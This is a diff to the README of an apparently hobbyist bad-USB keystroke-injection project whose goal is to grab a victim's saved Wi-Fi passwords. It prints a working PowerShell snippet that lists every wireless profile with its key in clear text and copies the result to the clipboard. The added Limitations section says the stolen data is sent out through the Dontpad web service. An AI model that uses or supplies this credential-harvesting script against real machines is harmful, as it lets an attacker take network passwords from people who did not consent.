@@ -8,7 +8,7 @@ This is a simple *keystroke injection* script designed for grabbing user's wifi 
 ## Implementation
 Script uses standard delay and keystoke commands. Inserting the bad usb will open PowerShell window. Credentials are obtained using the following simplified script:
 ```
-$a = (netsh wlan show profiles) | Select-String ' :(.*)' // store found devices
+$a = (netsh wlan show profiles) | Select-String ' :(.*)' // store all found profiles
 $count = 1
 $out = while($a.matches.groups[$count].value) { netsh wlan show profiles $a.matches.groups[$count].value.Trim() key=clear; $count+=2}
 write-output $out | clip // copy to clipboard
@@ -60,3 +60,7 @@ Cost settings
     Cost Source            : Operator
 
 ```
+## Limitations
+* **Exfiltrating data**: implementation recovers data from attacked machine using [Dontpad](https://dontpad.com/) (assuming internet connection).
+* **Delay**: differences between tested machines showed that applied delay between keystrokes may be too low resulting in skipping script steps.
+* **Demonstration purposes only**: commands executed are visible on attacked machine.
